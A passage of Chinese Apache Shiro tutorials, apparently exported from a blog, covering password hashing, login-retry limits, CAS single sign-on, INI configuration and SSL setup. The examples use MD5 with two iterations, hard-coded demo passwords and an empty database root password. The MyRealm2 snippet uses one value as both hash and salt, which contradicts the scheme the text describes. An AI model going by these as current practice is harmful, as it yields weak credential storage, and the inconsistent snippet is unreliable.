DefaultPasswordService；CredentialsMatcher 实现 PasswordMatcher 及 HashedCredentialsMatcher（更强大）。 DefaultPasswordService 配合 PasswordMatcher 实现简单的密码加密与验证服务 1、定义 Realm（com.github.zhangkaitao.shiro.chapter5.hash.realm.MyRealm） 12345678910111213public class MyRealm extends AuthorizingRealm &#123; private PasswordService passwordService; public void setPasswordService(PasswordService passwordService) &#123; this.passwordService = passwordService; &#125; //省略doGetAuthorizationInfo，具体看代码 @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; return new SimpleAuthenticationInfo( &quot;wu&quot;, passwordService.encryptPassword(&quot;123&quot;), getName()); &#125;&#125;&amp;nbsp; 为了方便，直接注入一个 passwordService 来加密密码，实际使用时需要在 Service 层使用 passwordService 加密密码并存到数据库。 2、ini 配置（shiro-passwordservice.ini） 1234567891011121314[main]passwordService=org.apache.shiro.authc.credential.DefaultPasswordServicehashService=org.apache.shiro.crypto.hash.DefaultHashServicepasswordService.hashService=$hashServicehashFormat=org.apache.shiro.crypto.hash.format.Shiro1CryptFormatpasswordService.hashFormat=$hashFormathashFormatFactory=org.apache.shiro.crypto.hash.format.DefaultHashFormatFactorypasswordService.hashFormatFactory=$hashFormatFactorypasswordMatcher=org.apache.shiro.authc.credential.PasswordMatcherpasswordMatcher.passwordService=$passwordServicemyRealm=com.github.zhangkaitao.shiro.chapter5.hash.realm.MyRealmmyRealm.passwordService=$passwordServicemyRealm.credentialsMatcher=$passwordMatchersecurityManager.realms=$myRealm&amp;nbsp; passwordService 使用 DefaultPasswordService，如果有必要也可以自定义； hashService 定义散列密码使用的 HashService，默认使用 DefaultHashService（默认 SHA-256 算法）； hashFormat 用于对散列出的值进行格式化，默认使用 Shiro1CryptFormat，另外提供了 Base64Format 和 HexFormat，对于有 salt 的密码请自定义实现 ParsableHashFormat 然后把 salt 格式化到散列值中； hashFormatFactory 用于根据散列值得到散列的密码和 salt；因为如果使用如 SHA 算法，那么会生成一个 salt，此 salt 需要保存到散列后的值中以便之后与传入的密码比较时使用；默认使用 DefaultHashFormatFactory； passwordMatcher 使用 PasswordMatcher，其是一个 CredentialsMatcher 实现； 将 credentialsMatcher 赋值给 myRealm，myRealm 间接继承了 AuthenticatingRealm，其在调用 getAuthenticationInfo 方法获取到 AuthenticationInfo 信息后，会使用 credentialsMatcher 来验证凭据是否匹配，如果不匹配将抛出 IncorrectCredentialsException 异常。 3、测试用例请参考 com.github.zhangkaitao.shiro.chapter5.hash.PasswordTest。 另外可以参考配置 shiro-jdbc-passwordservice.ini，提供了 JdbcRealm 的测试用例，测试前请先调用 sql/shiro-init-data.sql 初始化用户数据。 如上方式的缺点是：salt 保存在散列值中；没有实现如密码重试次数限制。 HashedCredentialsMatcher 实现密码验证服务 Shiro 提供了 CredentialsMatcher 的散列实现 HashedCredentialsMatcher，和之前的 PasswordMatcher 不同的是，它只用于密码验证，且可以提供自己的盐，而不是随机生成盐，且生成密码散列值的算法需要自己写，因为能提供自己的盐。 1、生成密码散列值 此处我们使用 MD5 算法，“密码 + 盐（用户名 + 随机数）” 的方式生成散列值： 12345678String algorithmName = &quot;md5&quot;;String username = &quot;liu&quot;;String password = &quot;123&quot;;String salt1 = username;String salt2 = new SecureRandomNumberGenerator().nextBytes().toHex();int hashIterations = 2;SimpleHash hash = new SimpleHash(algorithmName, password, salt1 + salt2, hashIterations);String encodedPassword = hash.toHex();&amp;nbsp; 如果要写用户模块，需要在新增用户 / 重置密码时使用如上算法保存密码，将生成的密码及 salt2 存入数据库（因为我们的散列算法是：md5(md5(密码 +username+salt2))）。 2、生成 Realm（com.github.zhangkaitao.shiro.chapter5.hash.realm.MyRealm2） 123456789protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; String username = &quot;liu&quot;; //用户名及salt1 String password = &quot;202cb962ac59075b964b07152d234b70&quot;; //加密后的密码 String salt2 = &quot;202cb962ac59075b964b07152d234b70&quot;;SimpleAuthenticationInfo ai = new SimpleAuthenticationInfo(username, password, getName()); ai.setCredentialsSalt(ByteSource.Util.bytes(username+salt2)); //盐是用户名+随机数 return ai;&#125;&amp;nbsp; 此处就是把步骤 1 中生成的相应数据组装为 SimpleAuthenticationInfo，通过 SimpleAuthenticationInfo 的 credentialsSalt 设置盐，HashedCredentialsMatcher 会自动识别这个盐。 如果使用 JdbcRealm，需要修改获取用户信息（包括盐）的 sql：“select password, password_salt from users where username = ?”，而我们的盐是由 username+password_salt 组成，所以需要通过如下 ini 配置（shiro-jdbc-hashedCredentialsMatcher.ini）修改： 123jdbcRealm.saltStyle=COLUMNjdbcRealm.authenticationQuery=select password, concat(username,password_salt) from users where username = ?jdbcRealm.credentialsMatcher=$credentialsMatcher&amp;nbsp; saltStyle 表示使用密码 + 盐的机制，authenticationQuery 第一列是密码，第二列是盐； 通过 authenticationQuery 指定密码及盐查询 SQL； 此处还要注意 Shiro 默认使用了 apache commons BeanUtils，默认是不进行 Enum 类型转型的，此时需要自己注册一个 Enum 转换器 “BeanUtilsBean.getInstance().getConvertUtils().register(new EnumConverter(), JdbcRealm.SaltStyle.class);” 具体请参考示例 “com.github.zhangkaitao.shiro.chapter5.hash.PasswordTest” 中的代码。 另外可以参考配置 shiro-jdbc-passwordservice.ini，提供了 JdbcRealm 的测试用例，测试前请先调用 sql/shiro-init-data.sql 初始化用户数据。 3、ini 配置（shiro-hashedCredentialsMatcher.ini） 12345678[main]credentialsMatcher=org.apache.shiro.authc.credential.HashedCredentialsMatchercredentialsMatcher.hashAlgorithmName=md5credentialsMatcher.hashIterations=2credentialsMatcher.storedCredentialsHexEncoded=truemyRealm=com.github.zhangkaitao.shiro.chapter5.hash.realm.MyRealm2myRealm.credentialsMatcher=$credentialsMatchersecurityManager.realms=$myRealm&amp;nbsp; 通过 credentialsMatcher.hashAlgorithmName=md5 指定散列算法为 md5，需要和生成密码时的一样； credentialsMatcher.hashIterations=2，散列迭代次数，需要和生成密码时的意义； credentialsMatcher.storedCredentialsHexEncoded=true 表示是否存储散列后的密码为 16 进制，需要和生成密码时的一样，默认是 base64； 此处最需要注意的就是 HashedCredentialsMatcher 的算法需要和生成密码时的算法一样。另外 HashedCredentialsMatcher 会自动根据 AuthenticationInfo 的类型是否是 SaltedAuthenticationInfo 来获取 credentialsSalt 盐。 4、测试用例请参考 com.github.zhangkaitao.shiro.chapter5.hash.PasswordTest。 密码重试次数限制 如在 1 个小时内密码最多重试 5 次，如果尝试次数超过 5 次就锁定 1 小时，1 小时后可再次重试，如果还是重试失败，可以锁定如 1 天，以此类推，防止密码被暴力破解。我们通过继承 HashedCredentialsMatcher，且使用 Ehcache 记录重试次数和超时时间。 com.github.zhangkaitao.shiro.chapter5.hash.credentials.RetryLimitHashedCredentialsMatcher： 1234567891011121314151617181920public boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info) &#123; String username = (String)token.getPrincipal(); //retry count + 1 Element element = passwordRetryCache.get(username); if(element == null) &#123; element = new Element(username , new AtomicInteger(0)); passwordRetryCache.put(element); &#125; AtomicInteger retryCount = (AtomicInteger)element.getObjectValue(); if(retryCount.incrementAndGet() &gt; 5) &#123; //if retry count &gt; 5 throw throw new ExcessiveAttemptsException(); &#125; boolean matches = super.doCredentialsMatch(token, info); if(matches) &#123; //clear retry count passwordRetryCache.remove(username); &#125; return matches;&#125;&amp;nbsp; 如上代码逻辑比较简单，即如果密码输入正确清除 cache 中的记录；否则 cache 中的重试次数 +1，如果超出 5 次那么抛出异常表示超出重试次数了。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单点登陆]]></title>
    <url>%2F2018%2F11%2F06%2F%E5%8D%95%E7%82%B9%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[单点登录Shiro 1.2 开始提供了 Jasig CAS 单点登录的支持，单点登录主要用于多系统集成，即在多个系统中，用户只需要到一个中央服务器登录一次即可访问这些系统中的任何一个，无须多次登录。此处我们使用 Jasig CAS v4.0.0-RC3 版本：https://github.com/Jasig/cas/tree/v4.0.0-RC3 Jasig CAS 单点登录系统分为服务器端和客户端，服务器端提供单点登录，多个客户端（子系统）将跳转到该服务器进行登录验证，大体流程如下： 访问客户端需要登录的页面 http://localhost:9080/client/，此时会跳到单点登录服务器 https://localhost:8443/server/login?service=https://localhost:9443/client/cas； 如果此时单点登录服务器也没有登录的话，会显示登录表单页面，输入用户名 / 密码进行登录； 登录成功后服务器端会回调客户端传入的地址：https://localhost:9443/client/cas?ticket=ST-1-eh2cIo92F9syvoMs5DOg-cas01.example.org，且带着一个 ticket； 客户端会把 ticket 提交给服务器来验证 ticket 是否有效；如果有效服务器端将返回用户身份； 客户端可以再根据这个用户身份获取如当前系统用户 / 角色 / 权限信息。 本章使用了和《第十四章 SSL》一样的数字证书。 服务器端我们使用了 Jasig CAS 服务器 v4.0.0-RC3 版本，可以到其官方的 github 下载：https://github.com/Jasig/cas/tree/v4.0.0-RC3 下载，然后将其 cas-server-webapp 模块封装到 shiro-example-chapter15-server 模块中，具体请参考源码。 1、数字证书使用和《第十四章 SSL》一样的数字证书，即将 localhost.keystore 拷贝到 shiro-example-chapter15-server 模块根目录下； 2、在 pom.xml 中添加 Jetty Maven 插件，并添加 SSL 支持： 123456789101112131415161718192021&lt;plugin&gt; &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt; &lt;artifactId&gt;jetty-maven-plugin&lt;/artifactId&gt; &lt;version&gt;8.1.8.v20121106&lt;/version&gt; &lt;configuration&gt; &lt;webAppConfig&gt; &lt;contextPath&gt;/$&#123;project.build.finalName&#125;&lt;/contextPath&gt; &lt;/webAppConfig&gt; &lt;connectors&gt; &lt;connector implementation=&quot;org.eclipse.jetty.server.nio.SelectChannelConnector&quot;&gt; &lt;port&gt;8080&lt;/port&gt; &lt;/connector&gt; &lt;connector implementation=&quot;org.eclipse.jetty.server.ssl.SslSocketConnector&quot;&gt; &lt;port&gt;8443&lt;/port&gt; &lt;keystore&gt;$&#123;project.basedir&#125;/localhost.keystore&lt;/keystore&gt; &lt;password&gt;123456&lt;/password&gt; &lt;keyPassword&gt;123456&lt;/keyPassword&gt; &lt;/connector&gt; &lt;/connectors&gt; &lt;/configuration&gt;&lt;/plugin&gt; 3、修改 src/main/webapp/WEB-INF/deployerConfigContext.xml，找到 primaryAuthenticationHandler，然后添加一个账户： 1&lt;entry key=&quot;zhang&quot; value=&quot;123&quot;/&gt; 其也支持如 JDBC 查询，可以自己定制；具体请参考文档。 4、mvn jetty:run 启动服务器测试即可：访问 https://localhost:8443/chapter15-server/login 将弹出如下登录页面： 输入用户名 / 密码，如 zhang/123，将显示登录成功页面： 到此服务器端的简单配置就完成了。 客户端1、首先使用 localhost.keystore 导出数字证书（公钥）到 D:\localhost.cer 1keytool -export -alias localhost -file D:\localhost.cer -keystore D:\localhost.keystore&amp;nbsp; 2、因为 CAS client 需要使用该证书进行验证，需要将证书导入到 JDK 中： 12cd D:\jdk1.7.0_21\jre\lib\securitykeytool -import -alias localhost -file D:\localhost.cer -noprompt -trustcacerts -storetype jks -keystore cacerts -storepass 123456&amp;nbsp; 如果导入失败，可以先把 security 目录下的 cacerts 删掉； 3、按照服务器端的 Jetty Maven 插件的配置方式配置 Jetty 插件； 4、在 shiro-example-chapter15-client 模块中导入 shiro-cas 依赖，具体请参考其 pom.xml； 5、自定义 CasRealm： 1234567891011121314public class MyCasRealm extends CasRealm &#123; private UserService userService; public void setUserService(UserService userService) &#123; this.userService = userService; &#125; @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123; String username = (String)principals.getPrimaryPrincipal(); SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo(); authorizationInfo.setRoles(userService.findRoles(username)); authorizationInfo.setStringPermissions(userService.findPermissions(username)); return authorizationInfo; &#125;&#125;&amp;nbsp; CasRealm 根据 CAS 服务器端返回的用户身份获取相应的角色 / 权限信息。 6、spring-shiro-web.xml 配置： 123456&lt;bean id=&quot;casRealm&quot; class=&quot;com.github.zhangkaitao.shiro.chapter13.realm.MyCasRealm&quot;&gt; &lt;property name=&quot;userService&quot; ref=&quot;userService&quot;/&gt; …… &lt;property name=&quot;casServerUrlPrefix&quot; value=&quot;https://localhost:8443/chapter14-server&quot;/&gt; &lt;property name=&quot;casService&quot; value=&quot;https://localhost:9443/chapter14-client/cas&quot;/&gt;&lt;/bean&gt;&amp;nbsp; casServerUrlPrefix：是 CAS Server 服务器端地址；casService：是当前应用 CAS 服务 URL，即用于接收并处理登录成功后的 Ticket 的； 如果角色 / 权限信息是由服务器端提供的话，我们可以直接使用 CasRealm： 123456789&lt;bean id=&quot;casRealm&quot; class=&quot;org.apache.shiro.cas.CasRealm&quot;&gt; …… &lt;property name=&quot;defaultRoles&quot; value=&quot;admin,user&quot;/&gt; &lt;property name=&quot;defaultPermissions&quot; value=&quot;user:create,user:update&quot;/&gt; &lt;property name=&quot;roleAttributeNames&quot; value=&quot;roles&quot;/&gt; &lt;property name=&quot;permissionAttributeNames&quot; value=&quot;permissions&quot;/&gt; &lt;property name=&quot;casServerUrlPrefix&quot; value=&quot;https://localhost:8443/chapter14-server&quot;/&gt; &lt;property name=&quot;casService&quot; value=&quot;https://localhost:9443/chapter14-client/cas&quot;/&gt;&lt;/bean&gt;&amp;nbsp; defaultRoles/ defaultPermissions：默认添加给所有 CAS 登录成功用户的角色和权限信息； roleAttributeNames/ permissionAttributeNames：角色属性 / 权限属性名称，如果用户的角色 / 权限信息是从服务器端返回的（即返回的 CAS Principal 中除了 Principal 之外还有如一些 Attributes），此时可以使用 roleAttributeNames/ permissionAttributeNames 得到 Attributes 中的角色 / 权限数据；请自行查询 CAS 获取用户更多信息。 123&lt;bean id=&quot;casFilter&quot; class=&quot;org.apache.shiro.cas.CasFilter&quot;&gt; &lt;property name=&quot;failureUrl&quot; value=&quot;/casFailure.jsp&quot;/&gt;&lt;/bean&gt;&amp;nbsp; CasFilter 类似于 FormAuthenticationFilter，只不过其验证服务器端返回的 CAS Service Ticket。 123456789101112131415161718&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt; &lt;property name=&quot;loginUrl&quot; value=&quot;https://localhost:8443/chapter14-server/login?service=https://localhost:9443/chapter14-client/cas&quot;/&gt; &lt;property name=&quot;successUrl&quot; value=&quot;/&quot;/&gt; &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;cas&quot; value-ref=&quot;casFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /casFailure.jsp = anon /cas = cas /logout = logout /** = user &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&amp;nbsp; loginUrl：https://localhost:8443/chapter15-server/login 表示服务端端登录地址，登录成功后跳转到?service 参数对于的地址进行客户端验证及登录；“/cas=cas”：即 /cas 地址是服务器端回调地址，使用 CasFilter 获取 Ticket 进行登录。 7、测试，输入 http://localhost:9080/chapter15-client 地址进行测试即可，可以使用如 Chrome 开这 debug 观察网络请求的变化。 如果遇到以下异常，一般是证书导入错误造成的，请尝试重新导入，如果还是不行，有可能是运行应用的 JDK 和安装数字证书的 JDK 不是同一个造成的： 1234567891011121314151617Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:385)at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:292)at sun.security.validator.Validator.validate(Validator.java:260)at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:326)at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:231)at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:126)at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1323) ... 67 more Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested targetat sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:196)at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:268)at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:380)... 73 more]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
        <tag>单点登陆</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[INI配置]]></title>
    <url>%2F2018%2F11%2F06%2FINI%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[INI 配置之前章节我们已经接触过一些 INI 配置规则了，如果大家使用过如 Spring 之类的 IoC/DI 容器的话，Shiro 提供的 INI 配置也是非常类似的，即可以理解为是一个 IoC/DI 容器，但是区别在于它从一个根对象 securityManager 开始。 根对象 SecurityManager从之前的 Shiro 架构图可以看出，Shiro 是从根对象 SecurityManager 进行身份验证和授权的；也就是所有操作都是自它开始的，这个对象是线程安全且真个应用只需要一个即可，因此 Shiro 提供了 SecurityUtils 让我们绑定它为全局的，方便后续操作。 因为 Shiro 的类都是 POJO 的，因此都很容易放到任何 IoC 容器管理。但是和一般的 IoC 容器的区别在于，Shiro 从根对象 securityManager 开始导航；Shiro 支持的依赖注入：public 空参构造器对象的创建、setter 依赖注入。 1、纯 Java 代码写法（com.github.zhangkaitao.shiro.chapter4.NonConfigurationCreateTest）： 12345678910111213141516171819202122232425DefaultSecurityManager securityManager = new DefaultSecurityManager();//设置authenticatorModularRealmAuthenticator authenticator = new ModularRealmAuthenticator();authenticator.setAuthenticationStrategy(new AtLeastOneSuccessfulStrategy());securityManager.setAuthenticator(authenticator);//设置authorizerModularRealmAuthorizer authorizer = new ModularRealmAuthorizer();authorizer.setPermissionResolver(new WildcardPermissionResolver());securityManager.setAuthorizer(authorizer);//设置RealmDruidDataSource ds = new DruidDataSource();ds.setDriverClassName(&quot;com.mysql.jdbc.Driver&quot;);ds.setUrl(&quot;jdbc:mysql://localhost:3306/shiro&quot;);ds.setUsername(&quot;root&quot;);ds.setPassword(&quot;&quot;);JdbcRealm jdbcRealm = new JdbcRealm();jdbcRealm.setDataSource(ds);jdbcRealm.setPermissionsLookupEnabled(true);securityManager.setRealms(Arrays.asList((Realm) jdbcRealm));//将SecurityManager设置到SecurityUtils 方便全局使用SecurityUtils.setSecurityManager(securityManager);Subject subject = SecurityUtils.getSubject();UsernamePasswordToken token = new UsernamePasswordToken(&quot;zhang&quot;, &quot;123&quot;);subject.login(token);Assert.assertTrue(subject.isAuthenticated()); 2、等价的 INI 配置（shiro-config.ini） 123456789101112131415161718192021[main]\#authenticatorauthenticator=org.apache.shiro.authc.pam.ModularRealmAuthenticatorauthenticationStrategy=org.apache.shiro.authc.pam.AtLeastOneSuccessfulStrategyauthenticator.authenticationStrategy=$authenticationStrategysecurityManager.authenticator=$authenticator\#authorizerauthorizer=org.apache.shiro.authz.ModularRealmAuthorizerpermissionResolver=org.apache.shiro.authz.permission.WildcardPermissionResolverauthorizer.permissionResolver=$permissionResolversecurityManager.authorizer=$authorizer\#realmdataSource=com.alibaba.druid.pool.DruidDataSourcedataSource.driverClassName=com.mysql.jdbc.DriverdataSource.url=jdbc:mysql://localhost:3306/shirodataSource.username=root\#dataSource.password=jdbcRealm=org.apache.shiro.realm.jdbc.JdbcRealmjdbcRealm.dataSource=$dataSourcejdbcRealm.permissionsLookupEnabled=truesecurityManager.realms=$jdbcRealm&amp;nbsp; 即使没接触过 IoC 容器的知识，如上配置也是很容易理解的： 对象名 = 全限定类名 相对于调用 public 无参构造器创建对象 对象名. 属性名 = 值 相当于调用 setter 方法设置常量值 对象名. 属性名 =$ 对象引用 相当于调用 setter 方法设置对象引用 3、Java 代码（com.github.zhangkaitao.shiro.chapter4.ConfigurationCreateTest） 123456789Factory&lt;org.apache.shiro.mgt.SecurityManager&gt; factory = new IniSecurityManagerFactory(&quot;classpath:shiro-config.ini&quot;);org.apache.shiro.mgt.SecurityManager securityManager = factory.getInstance();//将SecurityManager设置到SecurityUtils 方便全局使用SecurityUtils.setSecurityManager(securityManager);Subject subject = SecurityUtils.getSubject();UsernamePasswordToken token = new UsernamePasswordToken(&quot;zhang&quot;, &quot;123&quot;);subject.login(token);Assert.assertTrue(subject.isAuthenticated());&amp;nbsp; 如上代码是从 Shiro INI 配置中获取相应的 securityManager 实例： 默认情况先创建一个名字为 securityManager，类型为 org.apache.shiro.mgt.DefaultSecurityManager 的默认的 SecurityManager，如果想自定义，只需要在 ini 配置文件中指定 “securityManager=SecurityManager 实现类” 即可，名字必须为 securityManager，它是起始的根； IniSecurityManagerFactory 是创建 securityManager 的工厂，其需要一个 ini 配置文件路径，其支持 “classpath:”（类路径）、“file:”（文件系统）、“url:”（网络）三种路径格式，默认是文件系统； 接着获取 SecuriyManager 实例，后续步骤和之前的一样。 从如上可以看出 Shiro INI 配置方式本身提供了一个简单的 IoC/DI 机制方便在配置文件配置，但是是从 securityManager 这个根对象开始导航。 INI 配置ini 配置文件类似于 Java 中的 properties（key=value），不过提供了将 key/value 分类的特性，key 是每个部分不重复即可，而不是整个配置文件。如下是 INI 配置分类： 123456789101112131415[main]\#提供了对根对象securityManager及其依赖的配置securityManager=org.apache.shiro.mgt.DefaultSecurityManager…………securityManager.realms=$jdbcRealm[users]\#提供了对用户/密码及其角色的配置，用户名=密码，角色1，角色2username=password,role1,role2[roles]\#提供了角色及权限之间关系的配置，角色=权限1，权限2role1=permission1,permission2[urls]\#用于web，提供了对web url拦截相关的配置，url=拦截器[参数]，拦截器/index.html = anon/admin/** = authc, roles[admin], perms[&quot;permission1&quot;] [main] 部分 提供了对根对象 securityManager 及其依赖对象的配置。 创建对象 1securityManager=org.apache.shiro.mgt.DefaultSecurityManager 其构造器必须是 public 空参构造器，通过反射创建相应的实例。 常量值 setter 注入 12dataSource.driverClassName=com.mysql.jdbc.DriverjdbcRealm.permissionsLookupEnabled=true&amp;nbsp; 会自动调用 jdbcRealm.setPermissionsLookupEnabled(true)，对于这种常量值会自动类型转换。 对象引用 setter 注入 1234authenticator=org.apache.shiro.authc.pam.ModularRealmAuthenticatorauthenticationStrategy=org.apache.shiro.authc.pam.AtLeastOneSuccessfulStrategyauthenticator.authenticationStrategy=$authenticationStrategysecurityManager.authenticator=$authenticator&amp;nbsp; 会自动通过 securityManager.setAuthenticator(authenticator) 注入引用依赖。 嵌套属性 setter 注入 1securityManager.authenticator.authenticationStrategy=$authenticationStrategy 也支持这种嵌套方式的 setter 注入。 byte 数组 setter 注入 1234\#base64 byte[]authenticator.bytes=aGVsbG8=\#hex byte[]authenticator.bytes=0x68656c6c6f&amp;nbsp; 默认需要使用 Base64 进行编码，也可以使用 0x 十六进制。 Array/Set/List setter 注入 12authenticator.array=1,2,3authenticator.set=$jdbcRealm,$jdbcRealm&amp;nbsp; 多个之间通过 “，” 分割。 Map setter 注入 1authenticator.map=$jdbcRealm:$jdbcRealm,1:1,key:abc 即格式是：map=key：value，key：value，可以注入常量及引用值，常量的话都看作字符串（即使有泛型也不会自动造型）。 实例化 / 注入顺序 1234realm=Realm1realm=Realm12authenticator.bytes=aGVsbG8=authenticator.bytes=0x68656c6c6f&amp;nbsp; 后边的覆盖前边的注入。 测试用例请参考配置文件 shiro-config-main.ini。 [users] 部分 配置用户名 / 密码及其角色，格式：“用户名 = 密码，角色 1，角色 2”，角色部分可省略。如： 123[users]zhang=123,role1,role2wang=123&amp;nbsp; 密码一般生成其摘要 / 加密存储，后续章节介绍。 [roles] 部分 配置角色及权限之间的关系，格式：“角色 = 权限 1，权限 2”；如： 123[roles]role1=user:create,user:updaterole2=*&amp;nbsp; 如果只有角色没有对应的权限，可以不配 roles，具体规则请参考授权章节。 [urls] 部分 配置 url 及相应的拦截器之间的关系，格式：“url = 拦截器 [参数]，拦截器 [参数]，如： 12[urls]/admin/** = authc, roles[admin], perms[&quot;permission1&quot;]&amp;nbsp;]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
        <tag>INI配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSL]]></title>
    <url>%2F2018%2F11%2F05%2FSSL%2F</url>
    <content type="text"><![CDATA[SSL对于 SSL 的支持，Shiro 只是判断当前 url 是否需要 SSL 登录，如果需要自动重定向到 https 进行访问。 首先生成数字证书，生成证书到 D:\localhost.keystore使用 JDK 的 keytool 命令，生成证书（包含证书 / 公钥 / 私钥）到 D:\localhost.keystore： 12345678910111213141516171819202122keytool -genkey -keystore &quot;D:\localhost.keystore&quot; -alias localhost -keyalg RSA输入密钥库口令:再次输入新口令:您的名字与姓氏是什么? [Unknown]: localhost您的组织单位名称是什么? [Unknown]: sishuok.com您的组织名称是什么? [Unknown]: sishuok.com您所在的城市或区域名称是什么? [Unknown]: beijing您所在的省/市/自治区名称是什么? [Unknown]: beijing该单位的双字母国家/地区代码是什么? [Unknown]: cnCN=localhost, OU=sishuok.com, O=sishuok.com, L=beijing, ST=beijing, C=cn是否正确? [否]: y输入 &lt;localhost&gt; 的密钥口令 (如果和密钥库口令相同, 按回车):再次输入新口令: 通过如上步骤，生成证书到 D:\ localhost.keystore； 然后设置 tomcat 下的 server.xml 此处使用了 apache-tomcat-7.0.40 版本，打开 conf/server.xml，找到： 12345\&lt;!--&lt;Connector port=&quot;8443&quot; protocol=&quot;HTTP/1.1&quot; SSLEnabled=&quot;true&quot; maxThreads=&quot;150&quot; scheme=&quot;https&quot; secure=&quot;true&quot; clientAuth=&quot;false&quot; sslProtocol=&quot;TLS&quot; /&gt;\--&gt;&amp;nbsp; 替换为 1234&lt;Connector port=&quot;8443&quot; protocol=&quot;HTTP/1.1&quot; SSLEnabled=&quot;true&quot; maxThreads=&quot;150&quot; scheme=&quot;https&quot; secure=&quot;true&quot; clientAuth=&quot;false&quot; sslProtocol=&quot;TLS&quot; keystoreFile=&quot;D:\localhost.keystore&quot; keystorePass=&quot;123456&quot;/&gt;&amp;nbsp; keystorePass 就是生成 keystore 时设置的密码。 添加 SSL 到配置文件（spring-shiro-web.xml） 此处使用了和十三章一样的代码： 1234567891011121314151617181920&lt;bean id=&quot;sslFilter&quot; class=&quot;org.apache.shiro.web.filter.authz.SslFilter&quot;&gt; &lt;property name=&quot;port&quot; value=&quot;8443&quot;/&gt;&lt;/bean&gt;&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; …… &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt; &lt;entry key=&quot;ssl&quot; value-ref=&quot;sslFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /login.jsp = ssl,authc /logout = logout /authenticated.jsp = authc /** = user &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&amp;nbsp; SslFilter 默认端口是 443，此处使用了 8443；“/login.jsp = ssl,authc” 表示访问登录页面时需要走 SSL。 测试 最后把 shiro-example-chapter14 打成 war 包（mvn:package），放到 tomcat 下的 webapps 中，启动服务器测试，如访问 localhost:9080/chapter14/，会自动跳转到 https://localhost:8443/chapter14/login.jsp。 如果使用 Maven Jetty 插件，可以直接如下插件配置： 123456789101112131415161718192021&lt;plugin&gt; &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt; &lt;artifactId&gt;jetty-maven-plugin&lt;/artifactId&gt; &lt;version&gt;8.1.8.v20121106&lt;/version&gt; &lt;configuration&gt; &lt;webAppConfig&gt; &lt;contextPath&gt;/$&#123;project.build.finalName&#125;&lt;/contextPath&gt; &lt;/webAppConfig&gt; &lt;connectors&gt; &lt;connector implementation=&quot;org.eclipse.jetty.server.nio.SelectChannelConnector&quot;&gt; &lt;port&gt;8080&lt;/port&gt; &lt;/connector&gt; &lt;connector implementation=&quot;org.eclipse.jetty.server.ssl.SslSocketConnector&quot;&gt; &lt;port&gt;8443&lt;/port&gt; &lt;keystore&gt;$&#123;project.basedir&#125;/localhost.keystore&lt;/keystore&gt; &lt;password&gt;123456&lt;/password&gt; &lt;keyPassword&gt;123456&lt;/keyPassword&gt; &lt;/connector&gt; &lt;/connectors&gt; &lt;/configuration&gt;&lt;/plugin&gt;]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
        <tag>SSL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[授权]]></title>
    <url>%2F2018%2F11%2F05%2F%E6%8E%88%E6%9D%83%2F</url>
